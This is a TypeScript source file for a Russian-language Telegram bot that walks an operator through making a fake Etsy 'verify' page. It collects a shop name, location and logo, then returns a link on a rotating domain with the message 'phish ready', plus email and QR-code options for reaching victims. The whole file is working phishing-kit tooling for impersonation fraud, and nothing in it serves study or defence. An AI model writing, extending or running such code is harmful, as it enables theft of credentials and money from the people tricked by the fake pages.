import {Context} from "@/database/models/context";
import {Scene} from "grammy-scenes";
import {Composer, InlineKeyboard} from "grammy";
import {deleteAllMessages} from "@/helpers/deleteAllMessages";
import {Ads} from "@/database/models/ads";
import {adsRepository, domensRepository, profilesRepository} from "@/database";
import {getPictureMenu} from "@/helpers/getPictureMenu";
import moment from "moment/moment";
import {User} from "@/database/models/user";
import {getFlagEmoji} from "@/helpers/getFlagEmoji";
import console from "console";
const { chromium } = require('playwright');

export const composer = new Composer<Context>()
const regex = /^ad manual creation etsy verify (?<country>\w+)/gmi
composer.callbackQuery(regex, startScene)

async function startScene(ctx: Context) {
    const data = /^ad manual creation etsy verify (?<country>\w+)/gmi.exec(ctx.callbackQuery.data)
    return ctx.scenes.enter('manualCreationAd-EtsyVerify', {
        country: data.groups.country
    })
}

export const scene = new Scene<Context>('manualCreationAd-EtsyVerify')

async function cancel (ctx) {
    await deleteAllMessages(ctx.session.deleteMessage,ctx)
    ctx.scene.exit()
}

scene.always().callbackQuery('cancel manualCreationAd-EtsyVerify', cancel)

scene.do(async (ctx) => {
    ctx.session.createAdManual = {}
    ctx.session.deleteMessage = []
    ctx.session.service = 'etsy'
    ctx.session.country = ctx.scene.opts.arg.country

    const res = await ctx.reply(`<b>${getFlagEmoji(ctx.session.country)} Введи название магазина:</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{text: 'Отмена', callback_data: 'cancel manualCreationAd-EtsyVerify'}]
            ]
        }
    })
    ctx.session.deleteMessage.push(res.message_id)
    ctx.session.tgId = res.message_id
    ctx.scene.resume()
})

scene.wait().hears(/(^.+)/, async ctx => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)
    ctx.session.createAdManual.title = ctx.message.text

    const res = await ctx.reply(`<b>📍 Введи местоположение или отправь null:</b>`, {
        reply_markup: {
            inline_keyboard: [
                // [{text: 'Пропустить', callback_data: 'skip location'}],
                [{text: 'Отмена', callback_data: 'cancel manualCreationAd-EtsyVerify'}]
            ]
        }
    })
    ctx.session.deleteMessage.push(res.message_id)
    ctx.scene.resume()
})


scene.wait().hears(/(.+)/,async ctx => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)
    ctx.session.createAdManual.description = ctx.match[1]

    const res = await ctx.reply(`<b>🌌 Скинь лого магазина или отправь null:</b>`, {
        reply_markup: {
            inline_keyboard: [
                // [{text: 'Пропустить', callback_data: 'skip photo'}],
                [{text: 'Отмена', callback_data: 'cancel manualCreationAd-EtsyVerify'}]
            ]
        }
    })
    ctx.session.deleteMessage.push(res.message_id)

    ctx.scene.resume()
})
// scene.callbackQuery('skip location', async (ctx) => {
//     // const res = await ctx.reply(`<b>🌌 Скинь лого магазина:</b>`, {
//     //     reply_markup: {
//     //         inline_keyboard: [
//     //             [{text: 'Пропустить', callback_data: 'skip photo'}],
//     //             [{text: 'Отмена', callback_data: 'cancel manualCreationAd-EtsyVerify'}]
//     //         ]
//     //     }
//     // })
//     console.log(123)
//     return ctx.scene.goto("setPhoto")
// })
//
// scene.label("setPhoto")

scene.wait().on('message', async ctx => {
    ctx.session.deleteMessage.push(ctx.msg.message_id)
    if (ctx.message.photo) {
        const res = await ctx.getFile()
        ctx.session.createAdManual.img = res.file_path
    } else {
        ctx.session.createAdManual.img = "null"
    }

    ctx.scene.resume()
})

scene.do(async ctx => {
    const domen = await domensRepository.findOneBy({active: true, service: `etsy`})
    if (!domen) return ctx.reply('domen undefined error')

    const date = Date.now()
    const ad = new Ads()
    ad.price = 'null'
    ad.title = ctx.session.createAdManual.title
    ad.description = ctx.session.createAdManual.description
    ad.img = ctx.session.createAdManual.img
    ad.link = `2333383018-${date}`
    ad.originallink = 'none'
    ad.deliveryPrice = "null"
    ad.date = `${date}`
    ad.underService = 'verify'
    ad.country = ctx.session.country
    ad.service = 'etsy'
    ad.author = ctx.user
    ad.manualCreation = true
    await adsRepository.save(ad)

    await ctx.replyWithPhoto(await getPictureMenu(ctx.user), {
        caption:`
Фиш готов 👌

🆔 ID: <code>${ad.date}</code>

📦 <b>Магазин:</b> <code>${ad.title}</code>
💡 <b>Платформа: ETSY VERIFY [${ctx.session.country.toUpperCase()} ${getFlagEmoji(ctx.session.country)}]</b>
♻️ <b>Домен сменён ${moment(new Date(domen.dateChange)).fromNow()}</b>
➖➖➖➖➖➖➖
🌠 <b>Созданные ссылки:</b> <a href="https://${domen.link}/link/${ad.link}">LINK [2.0]</a>
➖➖➖➖➖➖➖
<code>https://${domen.link}/link/${ad.link}</code>
`.replace('\n', ''),
        reply_markup: await createKeyboard(ad.id, ctx.user)
    })
    ctx.scene.exit()
})

const createKeyboard = async (id: Number, user: User) => {
    const keyb = new InlineKeyboard()
    // .text("🙊 Настройки", `settings ad ${id}`)

    keyb.row()
    keyb.text("💌 EMAIL", `email ad ${id}`)
    keyb.text("🎲 QR-code", `qrcode get ${id}`)
    keyb.row()
    keyb.text("🖇 Создать копию", `etsy verify copy ${id}`)
    keyb.row()
    keyb.text("Главное меню", `menuWithPicture`)

    return keyb
}
